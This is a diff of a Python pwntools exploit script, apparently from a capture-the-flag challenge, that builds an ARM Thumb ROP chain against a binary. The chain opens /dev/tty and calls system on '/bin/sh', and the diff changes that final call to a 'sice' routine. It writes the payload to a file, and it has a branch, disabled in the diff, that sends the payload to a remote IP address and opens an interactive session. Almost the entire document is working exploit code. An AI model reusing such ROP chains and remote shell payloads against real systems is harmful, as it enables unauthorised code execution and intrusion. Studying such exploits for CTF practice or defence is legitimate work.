@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from pwn import *
 import os
+import sys
 
 context.binary = "./main_fixed"
 
@@ -9,7 +10,8 @@ rop_r1_t_adr = 0x0003777e # ; pop {r1, pc} !thumb
 rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}
 
 rop_add_sp_0xc_t_adr = 0x00014532  # ; add sp,#0xc / pop {r4, r5, pc}
-rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 ; pop {r4, pc}
+rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 / pop {r4, pc}
+rop_add_sp_0x14_t_adr = 0x00040242 # ; add sp, #0x14 / pop {r4, r5, pc}
 
 rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}
 
@@ -18,6 +20,7 @@ rop_mov_r0_r1_t_adr = 0x00022fde  # ; mov r0 r1 / bx lr
 rop_open_t_adr = 0x00021dac  # open
 rop_system_t_adr = 0x00014c10  # system
 rop_sice_t_adr = 0x00010424  # sice
+rop_continue_main_t_adr = 0x000104be  # main cont
 
 rop_set_r0_t_adr = 0x00034f6c  # ; pop {r0, r6, pc}
 
@@ -97,7 +100,8 @@ def build_set_r0(r0, r6):
 
 if True:
     tty_path = b"/dev/tty\x00"
-    #tty_path = b"/dev/pts/9\x00"
+    #tty_path = f"/dev/pts/{sys.argv[1]}\x00".encode("ascii")
+    #print(f"using {tty_path}")
 
     payload = b"0" * 0x20
     payload += b"1" * 4
@@ -117,18 +121,25 @@ if True:
     payload += tty_path
     payload += b"0" * ((prev_len + 0x28) - len(payload) + 4)
 
-    payload += p32(rop_add_sp_0x28_t_adr + 1)
-    payload += b"0" * 0x28
-    payload += b"0" * (4)  # for add sp (2 args)
+    payload += p32(rop_add_sp_0x14_t_adr + 1)
+    payload += b"0" * 0x14
+    payload += b"0" * (4 * 2)  # for add sp (2 args)
 
     # do open
-    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
-    payload += b"0" * 0x28
+    payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
+    payload += b"0" * 0x14
+    payload += b"0" * (4 * 2)  # for add sp (2 args)
 
     # move r1 to r0 and set r1 = O_RDRW
-    payload += b"0" * (4)  # for add sp (2 args)
     payload += mov_r0_r1_t(rop_r1_t_adr + 1)
     payload += p32(os.O_WRONLY)
+
+    # do open v2
+    #payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
+    #payload += b"0" * 0x14
+    #payload += b"0" * (4 * 2)  # for add sp (2 args)
+    #payload += mov_r0_r1_t(rop_r1_t_adr + 1)
+    #payload += p32(os.O_WRONLY)
 
     # payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
     # # open uses 16bytes of stack, reserve it
@@ -138,17 +149,18 @@ if True:
     # payload += mov_r0_r1_t(rop_r1_t_adr + 1)
     # payload += p32(os.O_WRONLY)
 
-    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
+    payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
     # open uses 16bytes of stack, reserve it
-    payload += b"0" * 0x28
-    payload += b"0" * (4)  # for add sp (two args)
+    payload += b"0" * 0x14
+    payload += b"0" * (4 * 2)  # for add sp (two args)
 
     # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
     payload += build_set_r0(location_bin_sh, 0)
-    payload += p32(rop_system_t_adr + 1)
+    payload += build_lr(rop_continue_main_t_adr + 1)
+    payload += p32(rop_sice_t_adr + 1)
     print(len(payload))
 
-    print(f"Payload Length: 0x{len(payload):x}")
+    print(f"Payload Length: {len(payload)}")
 
     assert(len(payload) < 340)
 else:
@@ -156,10 +168,9 @@ else:
     # with 0x200 bytes calls to system don't resolve
     ...
 with open("/local-tmp/payload", "bw") as fp:
-    fp.write(payload + b"\n")
-    fp.write(b"ls")
+    fp.write(payload)
 
-if True:
+if False:
     r = remote("34.125.56.151", 2222, ssl=False)
     r.sendline(payload)
     r.interactive()
@@ -172,6 +183,6 @@ b *0x010488
 b *0x00014c10
 c
 """)
-#io = process(context.binary.path)
+#io = process(context.binary.path, stdin=PTY)
 io.sendline(payload)
 io.interactive()
